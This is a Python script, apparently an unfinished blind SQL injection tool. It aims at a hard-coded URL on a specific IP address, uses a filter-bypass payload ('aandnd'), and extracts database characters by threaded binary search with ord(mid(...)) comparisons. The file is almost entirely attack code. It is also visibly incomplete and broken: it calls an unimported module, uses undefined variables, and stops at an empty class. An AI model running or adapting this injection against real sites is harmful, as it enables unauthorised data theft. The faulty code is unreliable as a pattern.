import requests
import threading
import time
def blindSql():
    length=32
    webAttact.MapAttacker('http://123.206.87.240:9004/1ndex.php?id=5\' aandnd {0} --+',length,0,65536).StartAttack()

class MapAttackerResult:
    index=0
    result=''
    def __init__(self,index,result):
        self.index=index
        self.result=result
    def compare(self,cmpResult,fun=None):
        if(fun == None):
            fun=self.defaultFun
        return fun(cmpResult.result,self.result)
    def defaultFun(self,a,b):
        return len(a)==len(b)
class Runner(threading.Thread):
        parent=None
        def __init__(self,threadName,parent):
            super(Runner,self).__init__(name = threadName)
            self.parent=parent
        def run(self):
            while not self.parent.getResult():
                time.sleep(0.1)
class MapAttackerSingleChr:
    #获取指定位置的值
    def getSingleResult(self,nowPos):
        tarUrl=self.parent.url.format(f'ord(mid({self.toFind},{nowPos},1))>{(self.low+self.high)/2}')
        self.lock.release()
        try:
            tmpResponse=requests.get(tarUrl,timeout=3).text
        except:
            self.lock.acquire()
            return self.getSingleResult(nowPos)
        
        self.lock.acquire()
        self.nowCompleteCount+=1
        if(self.nowCompleteCount>=len(self.ranges)):
            self.ComsumeNowResult()
        print(f"{index}:{tarUrl}:{str(len(tmpResponse))}")
        self.resultList.append(MapAttackerResult(index,tmpResponse)) 
    def __init__(self, parent,toTryPos):
        self.toTryPos=toTryPos#获取某位
        self.parent=parent
class MapAttacker: